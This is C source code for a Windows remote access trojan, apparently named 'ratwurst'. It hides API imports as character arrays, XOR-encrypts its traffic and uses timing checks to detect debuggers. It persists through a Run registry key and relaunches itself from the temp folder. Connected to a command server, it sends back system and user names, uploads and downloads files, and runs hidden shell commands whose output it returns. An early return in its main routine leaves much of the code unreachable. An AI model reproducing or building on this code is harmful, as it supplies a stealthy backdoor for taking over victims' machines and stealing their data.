

#include "ratwurst.h"
#include "tools.c"

#define global static
#define CRYPT_KEY 28

global HMODULE gLibraryKernel32;
global _recv* gf_recv;
global _CreateFileA* gf_CreateFileA;
global _CloseHandle* gf_CloseHandle;

typedef struct RATSocket
{
	HMODULE libraryWinsock2;
	SOCKET socketConnection;
	_WSAGetLastError *f_WSAGetLastError;	
} RATSocket;

int
EncryptDecryptString(char* str, int bufferSize)
{
	int i = 0;
	while(*str != 0 && i < bufferSize)
	{
		if ( *str != 0 )
		{
			*str++ = *str ^ (char)(CRYPT_KEY);
		}
		i++;
	}
	return 0;
}

int
SocketSend(RATSocket* ratSocket,
		   char* messageBuffer,
		   unsigned int bufferSize)
{
	char ca_send[] = { 's','e','n','d', 0};
	_send* f_send = (_send*)GetProcAddress(ratSocket->libraryWinsock2, ca_send);

	OutputDebugString(messageBuffer);
	OutputDebugString(" << Before\n");

	EncryptDecryptString(messageBuffer, bufferSize);

	OutputDebugString(messageBuffer);
	OutputDebugString(" << After\n");
	
	if ( f_send(ratSocket->socketConnection, messageBuffer, bufferSize, 0) == SOCKET_ERROR )
	{
#if DEBUG		
		char buffer[SOCKET_BUFFER_SIZE];
		sprintf_s(buffer, SOCKET_BUFFER_SIZE, "Socket failed with error: %ld\n", ratSocket->f_WSAGetLastError());
		OutputDebugStringA(buffer);
#endif		
		return 1;
	}
	return 0;
}

int
FetchInfo(RATSocket* ratSocket)
{
#if DEBUG	
	char bufferError[SOCKET_BUFFER_SIZE];
#endif	
	char bufferUser[UNLEN + 1];
	DWORD len = sizeof(bufferUser);

	char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
	char bufferComputer[MAX_COMPUTERNAME_LENGTH + 1];
	len = sizeof(bufferComputer);
			
	char ca_GetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
	_GetComputerNameA* f_GetComputerNameA = (_GetComputerNameA*)GetProcAddress(gLibraryKernel32, ca_GetComputerNameA);
			
	if ( f_GetComputerNameA(bufferComputer, &len) <= 0 )
	{
#if DEBUG		
		sprintf_s(bufferError, SOCKET_BUFFER_SIZE, "Could not get computer name: %ld\n", GetLastError());
		OutputDebugStringA(bufferError);
#endif

		strncpy_s(bufferComputer, MAX_COMPUTERNAME_LENGTH + 1, ca_unknown, strlen(ca_unknown));
	}

	char ca_advapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
	HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
	if ( !libraryAdvapi32 )
	{
#if DEBUG				
		OutputDebugStringA("Loading libraryAdvapi32 failed.\n");
#endif		
		return 1;
	}
			
	char ca_GetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
	_GetUserNameA* f_GetUserNameA = (_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUserNameA);

	if ( f_GetUserNameA(bufferUser, &len) <= 0 )
	{
#if DEBUG		
		sprintf_s(bufferError, SOCKET_BUFFER_SIZE, "Could not get username: %ld\n", GetLastError());
		OutputDebugStringA(bufferError);
#endif		

		strncpy_s(bufferUser, UNLEN + 1, ca_unknown, strlen(ca_unknown));
	}

	char bufferInfo[SOCKET_BUFFER_SIZE];
	sprintf_s(bufferInfo, SOCKET_BUFFER_SIZE, "%s:%s", bufferComputer, bufferUser);
	SocketSend(ratSocket, bufferInfo, (unsigned int)strlen(bufferInfo));

	return 0;
}

int
DownloadFile(RATSocket* ratSocket,
			 char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
{
	char* totalReceivedData = NULL;
	int totalBytesRead = 0;
	int fileSize = 0;
			
	char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = { 0 };
	if ( gf_recv(ratSocket->socketConnection, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 0) != SOCKET_ERROR )
	{
		EncryptDecryptString(fileSizeBuffer, FILE_SIZE_DIGIT_SIZE);
		fileSize = atoi(fileSizeBuffer);

		totalReceivedData = (char*)calloc(fileSize + 1, sizeof(char));
				
		for (;;)
		{
			char writeBuffer[SOCKET_BUFFER_SIZE + 1] = { 0 };
			int bytesRead = gf_recv(ratSocket->socketConnection, writeBuffer, SOCKET_BUFFER_SIZE, 0);
			if ( bytesRead != SOCKET_ERROR )
			{
#if DEBUG						
				OutputDebugStringA(writeBuffer);
#endif				
				strncat_s(totalReceivedData, fileSize + 1, writeBuffer, bytesRead);

				totalBytesRead += bytesRead;
				if ( totalBytesRead >= fileSize )
				{
					break;
				}
			}
			else
			{
#if DEBUG				
				OutputDebugStringA("[ERROR] Error receiving download command from server.");
#endif				
			}
		}
	}
	else
	{
		OutputDebugStringA("[ERROR] Error getting file size.");
	}

	EncryptDecryptString(totalReceivedData, fileSize + 1);
	OutputDebugStringA(totalReceivedData);

	HANDLE fileHandle = gf_CreateFileA(splittedCommand[1], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if ( fileHandle == INVALID_HANDLE_VALUE )
	{
		OutputDebugStringA("Error");
	}

	DWORD bytesWritten;

	char ca_WriteFile[] = { 'W','r','i','t','e','F','i','l','e',0 };
	_WriteFile* f_WriteFile = (_WriteFile*)GetProcAddress(gLibraryKernel32, ca_WriteFile);
	f_WriteFile(fileHandle, totalReceivedData, totalBytesRead, &bytesWritten, 0);

#if DEBUG			
	char buffer[256];
	sprintf_s(buffer, 256, "Bytes written: %ld\n", bytesWritten);
	OutputDebugStringA(buffer);
#endif	
	
	gf_CloseHandle(fileHandle);
			
	free(totalReceivedData);

	return 0;
}

int
UploadFile(RATSocket* ratSocket,
		   char* filePath)
{
	HANDLE fileHandle = CreateFileA(filePath,
									GENERIC_READ,
									0,
									NULL,
									OPEN_EXISTING,
									FILE_ATTRIBUTE_NORMAL,
									NULL);

	DWORD fileSize = GetFileSize(fileHandle, NULL);
	char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = { 0 };

	_itoa_s(fileSize, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 10);
	
	SocketSend(ratSocket,
			   fileSizeBuffer,
			   FILE_SIZE_DIGIT_SIZE);
	
	if ( fileHandle )
	{
		for(;;)
		{
			char readBuffer[SOCKET_BUFFER_SIZE] = { 0 };

			DWORD bytesRead;
			BOOL readFileResult = ReadFile(fileHandle,
										   &readBuffer,
										   SOCKET_BUFFER_SIZE,
										   &bytesRead,
										   NULL);
			
			if ( readFileResult && bytesRead > 0 )
			{
				SocketSend(ratSocket,
						   readBuffer,
						   SOCKET_BUFFER_SIZE);
#if DEBUG						
				OutputDebugStringA(readBuffer);
				OutputDebugStringA("\n");
#endif				
			}
			else
			{
				break;
			}
		}
		CloseHandle(fileHandle);
		return 0;
	}
	else
	{
		OutputDebugString("[ERROR] Error opening file.\n");
		return 1;
	}
}

int RunCommandInProcess(char *commandToRun, int waitForProcess)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);

	int cmdPathSize = MAX_PATH+8;
	char* cmdPath = (char*)calloc(cmdPathSize, sizeof(char));

	char ca_GetSystemDirectoryA[] = { 'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0 };
	_GetSystemDirectoryA* f_GetSystemDirectoryA = (_GetSystemDirectoryA*)GetProcAddress(gLibraryKernel32, ca_GetSystemDirectoryA);
	f_GetSystemDirectoryA(cmdPath, MAX_PATH);

	char ca_cmdexe[] = { '\\','c','m','d','.','e','x','e',0 };
	strncat_s(cmdPath, cmdPathSize, ca_cmdexe, 8);

	char cmdArg[MAX_PATH + 8 + 3] = { '/','C',' ',0 };
	strncat_s(cmdArg, cmdPathSize, commandToRun, strlen(commandToRun));

	char ca_CreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
	_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(gLibraryKernel32, ca_CreateProcessA);
	if ( !f_CreateProcessA(cmdPath, cmdArg, NULL, NULL, FALSE, CREATE_NO_WINDOW , NULL, NULL, &si, &pi) )
	{
#if DEBUG				
		char bufferError[256];
		sprintf_s(bufferError, 256, "CreateProcess failed (%d).\n", GetLastError());
		OutputDebugStringA(bufferError);
#endif
		return 1;
	}
	free(cmdPath);

	if ( waitForProcess )
	{
		char ca_WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
		_WaitForSingleObject* f_WaitForSingleObject = (_WaitForSingleObject*)GetProcAddress(gLibraryKernel32, ca_WaitForSingleObject);
		f_WaitForSingleObject( pi.hProcess, INFINITE );

		gf_CloseHandle(pi.hProcess);
		gf_CloseHandle(pi.hThread);
	}
	return 0;
}

int
ReceiveCmdCommand(RATSocket* ratSocket,
				  char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
{
	char commandToRun[MAX_PATH] = { 0 };

	int commandIndex = 1;
	while ( splittedCommand[commandIndex] != NULL )
	{
		strncat_s(commandToRun, MAX_PATH, splittedCommand[commandIndex], strlen(splittedCommand[commandIndex]));
		strncat_s(commandToRun, MAX_PATH, " ", 1);
		commandIndex++;
	}

	char randomFileName[11] = { 0 };
	GenerateRandomString(randomFileName, 6);
	strncat_s(randomFileName, 11, ".tmp", 4);

	char tempPath[MAX_PATH];

	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
	f_GetTempPathA(MAX_PATH, tempPath);
	
	char filePath[MAX_PATH];
	strncpy_s(filePath, MAX_PATH, tempPath, strlen(tempPath));
	strncat_s(filePath, MAX_PATH, randomFileName, 10);

	strncat_s(commandToRun, MAX_PATH, " > ", 3);
	strncat_s(commandToRun, MAX_PATH, filePath, strlen(tempPath) + 10);
	
	RunCommandInProcess(commandToRun, 1);

	UploadFile(ratSocket, filePath);

	// Alternative way to delete the temporary file. More info here: https://github.com/vxunderground/WinAPI-Tricks/blob/main/Kernel32/DeleteFileAlt/DeleteFileAltA.c
	HANDLE handle = gf_CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if ( handle == INVALID_HANDLE_VALUE )
	{
#if DEBUG		
		OutputDebugStringA("Error deleting file at");
		OutputDebugStringA(filePath);
#endif		
	}
	gf_CloseHandle(handle);

	return 0;
}

void
CopyAndRunFromTempFolder(char* currentPath, char* newPath)
{
	char ca_CopyFileA[] = { 'C','o','p','y','F','i','l','e','A',0 };
	_CopyFileA* f_CopyFileA = (_CopyFileA*)GetProcAddress(gLibraryKernel32, ca_CopyFileA);

	if ( f_CopyFileA == NULL )
	{
#if DEBUG
		char buffer[256];
		sprintf_s(buffer, 256, "Failure in getting CopyFileA using GetProcAddress: %d\n", GetLastError());
		OutputDebugStringA(buffer);
#endif		
	}
	
	if ( f_CopyFileA(currentPath, newPath, 0) == 0 )
	{
#if DEBUG
		char buffer[256];
		sprintf_s(buffer, 256, "Failure in copying the file: %d\n", GetLastError());
		OutputDebugStringA(buffer);
#endif		
	}

	// Runs a cmd process: Waits for a while, deletes the current file, and then runs the newly copied file
	//
	char pingCommand[] = { 'p','i','n','g',' ','1','2','7','.','0','.','0','.','1',' ','&',' ','d','e','l',' ',0 };
	size_t pingCommandLength = strlen(pingCommand);
	char commandToRun[MAX_PATH * 2 + 30] = { 0 };
	int commandToRunSize = MAX_PATH * 2 + 30;
	strncpy_s(commandToRun, commandToRunSize, pingCommand, pingCommandLength);
	strncat_s(commandToRun, commandToRunSize, currentPath, strlen(currentPath));

	char callCommand[] = { ' ','&',' ','c','a','l','l',' ',0 };
	strncat_s(commandToRun, commandToRunSize, callCommand, strlen(currentPath));
	strncat_s(commandToRun, commandToRunSize, newPath, strlen(newPath));
		
	RunCommandInProcess(commandToRun, 0);
}

int SetupRegistryKey(const char* execPath)
{
	HKEY keyHandle;

	char ca_RegOpenKeyExA[] = { 'R','e','g','O','p','e','n','K','e','y','E','x','A',0 };
	_RegOpenKeyExA* f_RegOpenKeyExA = (_RegOpenKeyExA*)GetProcAddress(gLibraryKernel32, ca_RegOpenKeyExA);
	LSTATUS regOpenStatus = f_RegOpenKeyExA(HKEY_CURRENT_USER,
										  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
										  0, KEY_WRITE, &keyHandle);
	if ( regOpenStatus != ERROR_SUCCESS )
	{
#if DEBUG
		OutputDebugStringA("Error opening the registry key.");
#endif
		return 1;
	}

	char ca_command[] = { 'c','m','d','.','e','x','e',' ','/','s',' ','/','c',' ','s','t','a','r','t',' ','"','"',' ','/','m','i','n',' ',0 };
	size_t lenCommand = strlen(ca_command) + 1;
	size_t lenExecPath = strlen(execPath) + 1;
	size_t lenRegValue = lenCommand + lenExecPath;
	char* regValue = (char*)calloc(lenRegValue, sizeof(char));
	strncpy_s(regValue, lenRegValue, ca_command, lenCommand);
	strncat_s(regValue, lenRegValue, execPath, lenExecPath);

	char ca_keyName[] = { 'r','t','w','r','s','t',0 };
	
	char ca_RegSetValueExA[] = { 'R','e','g','S','e','t','V','a','l','u','e','E','x','A',0 };
	_RegSetValueExA* f_RegSetValueExA = (_RegSetValueExA*)GetProcAddress(gLibraryKernel32, ca_RegSetValueExA);
	LSTATUS regSetStatus = f_RegSetValueExA(keyHandle,
										  ca_keyName,
										  0,
										  REG_SZ,
										  (const BYTE *)regValue,
										  (DWORD)lenRegValue);
	if ( regSetStatus != ERROR_SUCCESS )
	{
#if DEBUG
		OutputDebugStringA("Error setting the registry key.");
#endif
		return 1;
	}

	free(regValue);

	char ca_RegCloseKey[] = { 'R','e','g','C','l','o','s','e','K','e','y',0 };
	_RegCloseKey* f_RegCloseKey = (_RegCloseKey*)GetProcAddress(gLibraryKernel32, ca_RegCloseKey);
	f_RegCloseKey(keyHandle);
	return 0;
}

int CALLBACK
WinMain(HINSTANCE hInstance,
		HINSTANCE hPrevInstance,
		LPSTR lpCmdLine,
		int nCmdShow)
{
	DWORD processList[1024];
	DWORD cbNeeded;
	DWORD numProcesses;

	if ( !EnumProcesses(processList, sizeof(processList), &cbNeeded) )
	{
		return 1;
	}
	numProcesses = cbNeeded / sizeof(DWORD);
	for ( unsigned int i = 0 ; i < numProcesses ; i++ )
	{
		DWORD processId = processList[i];
		if ( processId == 0 )
		{
			continue;
		}

		HANDLE processHandle = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
									   FALSE, processId);
		if ( NULL != processHandle )
		{
			HMODULE hModule;
			DWORD cbNeeded;

			if ( EnumProcessModules( processHandle, &hModule, sizeof(hModule), &cbNeeded) )
			{
				char processName[MAX_PATH];
				GetModuleBaseNameA( processHandle, hModule, processName, sizeof(processName)/sizeof(char));

				OutputDebugStringA(processName);
				OutputDebugStringA("\n");
			}
			else
			{
				
			}
		}
		else
		{

		}
	}
	
	return 0;
	
 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
	
#if !DEBUG	
	LONGLONG cycleCountDiff;
	LARGE_INTEGER performanceCounterStart;
	LARGE_INTEGER performanceCounterCurrent;
	LARGE_INTEGER performanceFrequency;

	char ca_QueryPerformanceFrequency[] = { 'Q','u','e','r','y','P','e','r','f','o','r','m','a','n','c','e','F','r','e','q','u','e','n','c','y',0 };
	_QueryPerformanceFrequency* f_QueryPerformanceFrequency = (_QueryPerformanceFrequency*)GetProcAddress(gLibraryKernel32, ca_QueryPerformanceFrequency);
	f_QueryPerformanceFrequency(&performanceFrequency);

	char ca_QueryPerformanceCounter[] = { 'Q','u','e','r','y','P','e','r','f','o','r','m','a','n','c','e','C','o','u','n','t','e','r',0 };
	_QueryPerformanceCounter* f_QueryPerformanceCounter = (_QueryPerformanceCounter*)GetProcAddress(gLibraryKernel32, ca_QueryPerformanceCounter);
	f_QueryPerformanceCounter(&performanceCounterStart);
#endif	
	
	char currentPath[MAX_PATH];
	if ( GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0 )
	{
#if DEBUG
		OutputDebugStringA("Failed getting the module file name.");
#endif		
	}

	char tempPath[MAX_PATH] = { 0 };

	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
	f_GetTempPathA(MAX_PATH, tempPath);


	int execPathSize = MAX_PATH + 9;
	char* execPath = (char*)calloc(execPathSize, sizeof(char));
	
	strncpy_s(execPath, execPathSize, tempPath, strlen(tempPath));

	char ca_tmpName[] = { 'r','t','w','r','s','t','.','t','m','p',0 };
	strncat_s(execPath, execPathSize, ca_tmpName, 9);

#if DEBUG
/* #if !DEBUG	 */
	if ( 0 )
#else
	if ( strcmp(currentPath, execPath) != 0 )
#endif
	{
		SetupRegistryKey(execPath);
		CopyAndRunFromTempFolder(currentPath, execPath);
		return 0;
	}

	free(execPath);
	
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
	UNREFERENCED_PARAMETER(nCmdShow);
	
	srand( (unsigned)time( NULL ) );
	
	RATSocket ratSocket = { 0 };
	
	char ca_ws2_32[] = {'W','s','2','_','3','2','.','d','l','l', 0};
	ratSocket.libraryWinsock2 = LoadLibraryA(ca_ws2_32);
	if ( !ratSocket.libraryWinsock2 )
	{
#if DEBUG				
		OutputDebugStringA("Loading ratSocket.libraryWinsock2 failed.\n");
#endif		
		return 1;
	}

	char ca_WSAGetLastError[] = { 'W','S','A','G','e','t','L','a','s','t','E','r','r','o','r', 0 };
	char ca_WSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
	ratSocket.f_WSAGetLastError = (_WSAGetLastError*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAGetLastError);

	char ca_CloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
	gf_CloseHandle = (_CloseHandle*)GetProcAddress(gLibraryKernel32, ca_CloseHandle);

#if !DEBUG
	f_QueryPerformanceCounter(&performanceCounterCurrent);
	cycleCountDiff = (performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart) / performanceFrequency.QuadPart;
	if ( cycleCountDiff > 3 )
		return 1;
#endif	
	
	for(;;)
	{
#if !DEBUG
		f_QueryPerformanceCounter(&performanceCounterStart);
#endif		
		
		WSADATA wsaData;

		_WSAStartup* f_WSAStartup = (_WSAStartup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAStartup);
		if ( f_WSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR )
		{
#if DEBUG					
			OutputDebugStringA("WSAStartup failed.\n");
#endif			
			return 1;
		}

		char ca_socket[] = { 's','o','c','k','e','t',0 };
		_socket* f_socket = (_socket*)GetProcAddress(ratSocket.libraryWinsock2, ca_socket);

		ratSocket.socketConnection = f_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if ( ratSocket.socketConnection == INVALID_SOCKET )
		{
#if DEBUG					
			char buffer[256];
			sprintf_s(buffer, 256, "Socket failed with error: %ld\n", ratSocket.f_WSAGetLastError());
			OutputDebugStringA(buffer);
#endif			

			char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
			_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
			f_WSACleanup();
			return 1;
		}

		char ca_htons[] = { 'h','t','o','n','s',0 };
		char ca_inet_addr[] = { 'i','n','e','t','_','a','d','d','r',0 };
	
		_htons* f_htons = (_htons*)GetProcAddress(ratSocket.libraryWinsock2, ca_htons);
		_inet_addr* f_inet_addr = (_inet_addr*)GetProcAddress(ratSocket.libraryWinsock2, ca_inet_addr);

		char ca_ip_addr[] = { '1','2','7','.','0','.','0','.','1', 0 };
 
		struct sockaddr_in socketAddress;
		socketAddress.sin_family = AF_INET;
		socketAddress.sin_port = f_htons(65432);
		socketAddress.sin_addr.s_addr = f_inet_addr(ca_ip_addr);

		char ca_connect[] = { 'c','o','n','n','e','c','t', 0};
		_connect* f_connect = (_connect*)GetProcAddress(ratSocket.libraryWinsock2, ca_connect);

		if ( f_connect(ratSocket.socketConnection, (SOCKADDR*) &socketAddress, sizeof(socketAddress)) != SOCKET_ERROR )
		{
#if DEBUG					
			OutputDebugStringA("Connection successful!\n");
#endif			
			break;
		}
		else
		{
#if DEBUG					
			char buffer[256];
			sprintf_s(buffer, 256, "Socket failed with error: %ld\nReconnecting...\n", ratSocket.f_WSAGetLastError());
			OutputDebugStringA(buffer);
#endif			

			// Try to reconnect
			// 
			char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
			_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
			f_closesocket(ratSocket.socketConnection);

			char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
			_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
			f_WSACleanup();
			
			Sleep(10000);
		}

#if !DEBUG
		f_QueryPerformanceCounter(&performanceCounterCurrent);
		cycleCountDiff = (performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart) / performanceFrequency.QuadPart;

		char buffer[256];
		sprintf_s(buffer, 256, "Checking: %ld\n", cycleCountDiff);
		OutputDebugStringA(buffer);
		
		if ( cycleCountDiff > 20 )
			return 1;
#endif		
	}

	char ca_login[] = { 'l','o','g','i','n',0 };
	SocketSend(&ratSocket, ca_login, 5);

	char ca_recv[] = { 'r','e','c','v', 0 };
	gf_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
	
	//char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };

	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
	if ( !gLibraryKernel32 )
	{
#if DEBUG				
		OutputDebugStringA("Loading gLibraryKernel32 failed.\n");
#endif		
		return 1;
	}

	char ca_CreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0 };
	gf_CreateFileA = (_CreateFileA*)GetProcAddress(gLibraryKernel32, ca_CreateFileA);
	
	for(;;)
	{
		char recvBuffer[SOCKET_BUFFER_SIZE] = { 0 };
		if ( gf_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
		{
#if DEBUG					
			OutputDebugStringA("Error receiving message.");
#endif			
		}
#if !DEBUG
		f_QueryPerformanceCounter(&performanceCounterStart);
#endif		

		EncryptDecryptString(recvBuffer, SOCKET_BUFFER_SIZE);

#if DEBUG				
		OutputDebugStringA("Received command: ");
#endif		
		char ca_info[] = { 'i','n','f','o',0 };
		char ca_cmd[] = { 'c','m','d',0 };
		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
		char ca_upload[] = { 'u','p','l','o','a','d',0 };
		char ca_download[] = { 'd','o','w','n','l','o','a','d',0 };

		char* splittedCommand[SPLIT_STRING_ARRAY_SIZE] = { 0 };
		SplitString(recvBuffer, splittedCommand, " ");
		
		if ( strcmp(splittedCommand[0], ca_info) == 0 )
		{
			FetchInfo(&ratSocket);
		}
		else if ( strcmp(splittedCommand[0], ca_upload) == 0 )
		{
			UploadFile(&ratSocket, splittedCommand[1]);
		}
		else if ( strcmp(splittedCommand[0], ca_download) == 0 )
		{
			DownloadFile(&ratSocket, splittedCommand);
		}
		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
		{
			ReceiveCmdCommand(&ratSocket, splittedCommand);
		}
		else if ( strcmp(splittedCommand[0], ca_shutdown) == 0 )
		{
#if DEBUG					
			OutputDebugStringA("Received shutdown command.\n");
#endif			
			break;
		}
		else
		{
#if DEBUG					
			OutputDebugStringA("[WARNING] Unrecognized command: ");
			OutputDebugStringA(recvBuffer);
			OutputDebugStringA("\n");
#endif			
			
			break;
		}
		OutputDebugStringA("\n");

#if !DEBUG
		f_QueryPerformanceCounter(&performanceCounterCurrent);
		cycleCountDiff = (performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart) / performanceFrequency.QuadPart;		
		if ( cycleCountDiff > 3 )
			return 1;

#endif		
		
		Sleep(3000);
	}

#if DEBUG			
	OutputDebugStringA("Shutting down...");
#endif	
	
	char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
	_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
	f_closesocket(ratSocket.socketConnection);

	char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
	_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
	f_WSACleanup();
	
	return 0;
}
